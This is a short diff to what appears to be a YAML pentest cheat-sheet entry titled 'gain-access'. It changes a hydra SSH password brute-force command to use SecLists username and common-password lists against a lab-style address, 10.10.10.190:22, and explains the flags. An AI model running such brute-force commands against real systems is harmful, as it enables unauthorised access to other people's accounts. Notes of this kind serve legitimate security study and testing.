@@ -3,7 +3,7 @@ functions:
   gain-access:
     - description: hydra
       code: |
-        hydra -l luginfo -P rockyou.txt ssh://<ip>:<port> -t 6
+        hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://10.10.10.190:22 -t 6
         
         -l --> login_name
         -P --> password_list
